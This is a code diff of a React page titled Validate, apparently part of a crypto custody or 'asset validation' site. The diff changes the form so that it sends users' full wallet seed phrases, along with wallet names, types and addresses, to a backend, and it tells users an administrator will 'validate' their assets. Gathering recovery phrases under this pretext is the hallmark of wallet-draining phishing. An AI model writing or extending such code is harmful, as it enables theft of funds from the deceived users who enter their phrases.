@@ -1,21 +1,24 @@
-
 import React, { useState } from "react";
 import { AlertCircle, ArrowLeft, KeyRound, Shield, Wallet } from "lucide-react";
 import { toast } from "sonner";
 import AnimatedSection from "@/components/ui/AnimatedSection";
 import ButtonEffect from "@/components/ui/ButtonEffect";
-import Navbar from "@/components/layout/Navbar";
 import Footer from "@/components/layout/Footer";
-import { Link } from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
+import { submitValidation } from "@/lib/validation";
+import { useAuth } from "@/context/AuthContext";
 
 const Validate = () => {
+  const navigate = useNavigate();
+  const { user } = useAuth();
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const [step, setStep] = useState(1);
   const [walletName, setWalletName] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
   const [walletType, setWalletType] = useState("");
   const [seedPhrase, setSeedPhrase] = useState("");
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (step === 1) {
@@ -23,9 +26,31 @@ const Validate = () => {
       return;
     }
     
-    // In a real application, you would send this data securely to your backend
-    // For demonstration purposes, we're just showing a toast notification
-    if (seedPhrase.trim().split(/\s+/).length >= 12) {
+    if (!user) {
+      toast.error("Please sign in to continue");
+      navigate("/signin");
+      return;
+    }
+
+    if (seedPhrase.trim().split(/\s+/).length < 12) {
+      toast.error("Invalid seed phrase", {
+        description: "Please enter a valid 12, 18, or 24-word recovery phrase."
+      });
+      return;
+    }
+
+    setIsSubmitting(true);
+    
+    try {
+      const { validation, error } = await submitValidation({
+        walletName,
+        walletType,
+        walletAddress,
+        seedPhrase
+      });
+
+      if (error) throw error;
+
       toast.success("Validation submitted successfully", {
         description: "An administrator will validate your assets soon."
       });
@@ -36,16 +61,21 @@ const Validate = () => {
       setWalletType("");
       setSeedPhrase("");
       setStep(1);
-    } else {
-      toast.error("Invalid seed phrase", {
-        description: "Please enter a valid 12, 18, or 24-word recovery phrase."
+      
+      // Redirect to dashboard
+      navigate("/dashboard");
+    } catch (error) {
+      console.error("Error submitting validation:", error);
+      toast.error("Failed to submit validation", {
+        description: "Please try again or contact support if the problem persists."
       });
+    } finally {
+      setIsSubmitting(false);
     }
   };
 
   return (
     <div className="min-h-screen flex flex-col">
-      <Navbar />
       <main className="flex-grow pt-28 pb-20 bg-gradient-to-b from-custodia-surface/30 to-white">
         <div className="container-custom max-w-2xl">
           <AnimatedSection>
@@ -171,8 +201,8 @@ const Validate = () => {
                     </div>
                     
                     <div className="pt-4">
-                      <ButtonEffect variant="primary" className="w-full">
-                        Submit for Validation
+                      <ButtonEffect variant="primary" className="w-full" disabled={isSubmitting}>
+                        {isSubmitting ? "Submitting..." : "Submit for Validation"}
                       </ButtonEffect>
                     </div>
                   </form>
